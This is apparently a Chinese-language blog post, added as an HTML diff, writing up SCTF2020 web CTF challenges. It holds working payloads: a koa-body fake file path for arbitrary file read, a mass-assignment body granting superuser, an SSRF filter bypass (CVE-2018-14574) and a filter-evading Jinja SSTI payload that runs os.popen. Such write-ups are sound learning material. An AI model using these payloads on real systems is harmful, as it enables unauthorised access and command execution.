@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Blackw4tch">
+
+
+
+
+
+<title>SCTF2020部分web题目复现 | Blackw4tch&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Blackw4tch&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Blackw4tch&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SCTF2020部分web题目复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Blackw4tch</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 9, 2021&nbsp;&nbsp;21:24:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h3><p><em><strong>知识点：任意文件读取，node.js ctx.request.body的文件移动漏洞</strong></em></p>
+<p>首先题目给了源码，uploadfile的处理逻辑如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/uploadfile&#x27;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line">    <span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">    <span class="keyword">let</span> fileId = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(file.name + <span class="built_in">Date</span>.now() + SECRET).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> filePath = path.join(__dirname, <span class="string">&#x27;upload/&#x27;</span>) + fileId</span><br><span class="line">    <span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br><span class="line">    reader.pipe(upStream)</span><br><span class="line">    <span class="keyword">return</span> ctx.body = <span class="string">&quot;Upload success ~, your fileId is here：&quot;</span> + fileId;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+
+<p>搜到这条issue <code>https://github.com/dlau/koa-body/issues/75</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if you add JSON parsing as global middleware. Suppose it expects the files to be in a field named &#x27;uploads&#x27;. Then you can make a POST or PUT request to &#x27;/upload-files&#x27; with a JSON body that looks something like &#123;&quot;files&quot;: &#123;&quot;uploads&quot;: [&#123;&quot;path&quot;: &quot;/any/file/path&quot;&#125;]&#125;&#125;, making the request handler think a file has been uploaded to /any/file/path</span><br></pre></td></tr></table></figure>
+
+<p>post: <code>&#123;&quot;files&quot;:&#123;&quot;file&quot;:&#123;&quot;path&quot;:&quot;flag&quot;,&quot;name&quot;:&quot;1&quot;&#125;&#125;&#125;</code><br><em>估计题目描述给了flag在当前目录下，我没想到也没搜到如何确定flag位置的</em></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2540037/1614047931517-2cb26c6f-c9d2-4317-9cdb-0a1cd0e74419.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=3.png&originHeight=414&originWidth=2074&size=108866&status=done&style=none&width=2074" alt="3.png"></p>
+<h3 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h3><p><em><strong>知识点：Mass assignment -&gt; rpc -&gt; SSRF -&gt; SSTI getshell</strong></em></p>
+<h4 id="1-获取admin权限"><a href="#1-获取admin权限" class="headerlink" title="1.获取admin权限"></a>1.获取admin权限</h4><p>源码注册处理如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到把json对象全部传入了create_user，这是python的一个语法，会把字典元素变为键值对作为函数参数<br><code>User.objects.create_user(username=&quot;admin&quot;,password=&quot;123456&quot;)</code><br>所以我们可以传入恶意键值对，在注册的时候直接变为admin，查阅文档或者翻下django项目的数据库找到对应列名，传入<code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1&#125;</code><br>登入admin获取token。</p>
+<h4 id="2-bypass-SSRF"><a href="#2-bypass-SSRF" class="headerlink" title="2.bypass SSRF"></a>2.bypass SSRF</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf_check</span>(<span class="params">url ,white_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(white_list)):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&quot;http://&quot;</span> + white_list[i] + <span class="string">&quot;/&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>这里注意看题目给的requestments.txt，其他的版本都是最新的只有Django==2.0.7是很老的版本，查一下有个 CVE-2018-14574，可以 bypass 这个waf </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Must 127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    ......</span><br><span class="line"> 	 <span class="keyword">elif</span> methods == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        data = base64.b64decode(request.GET.get(<span class="string">&quot;data&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.post(url, data=data,</span><br><span class="line">                                                                 headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>,</span><br><span class="line">                                                                          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>rpc(Remote Procedure Call)： 远程过程调用</strong><br>flask框架本身有个FLASK-JSONRPC库，但是这里出题人是自己写了一个模拟rpc过程的请求。可以如下构造访问web2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;token&quot;:&quot;xxx&quot;,&quot;url&quot;:&quot;http://39.104.19.182//127.0.0.1:8000/rpc?methods=GET&amp;url=http:%2f%2f127.0.0.1:5000&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入web2</p>
+<h4 id="3-bypass-SSTI"><a href="#3-bypass-SSTI" class="headerlink" title="3.bypass SSTI"></a>3.bypass SSTI</h4><h5 id="1-bypass-和"><a href="#1-bypass-和" class="headerlink" title="1.bypass { {和{ %"></a>1.bypass { {和{ %</h5><p>在json解码之前过滤掉了模版注入的关键符号</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    data = <span class="built_in">str</span>(request.data)</span><br><span class="line">    log()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#123;%&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;%&#125;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里跟进一下get_json()方法，对传入的body自动编码再解码，就可以先把payload用UTF16编码再传入，具体跟进get_json的过程单独总结。<br>或者用json的特性，JSON 支持 <code>\uxxxx</code> 利用unicode 转义字符绕过。</p>
+<h5 id="2-bypass字母"><a href="#2-bypass字母" class="headerlink" title="2.bypass字母"></a>2.bypass字母</h5><ol>
+<li>python有一个8进制表示的特性，比如’\123’，写个脚本存入字典，绕过num1\num2</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">&quot;\\&quot;</span></span><br><span class="line">dicc = []</span><br><span class="line">exploit = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;dicc.append(&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;\\&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">    exploit += <span class="string">&quot;////&quot;</span>+ <span class="built_in">str</span>(dicc.index(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exploit)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>对payload进行base64编码，绕过symbols</li>
+</ol>
+<p>这里贴下frank的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssti = <span class="string">&#x27;&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;/readflag&quot;).read() + &quot;&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="string">&#x27;&#123;&#x27;</span> + json.dumps(&#123;</span><br><span class="line">    <span class="string">&#x27;num1&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;num2&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;symbols&#x27;</span>: ssti,</span><br><span class="line">&#125;)[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\u007b&#x27;</span>).replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\\u007d&#x27;</span>) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b64encode(payload.encode()).decode()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2021 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/06/09/hello-world/">Hello World</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Blackw4tch | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
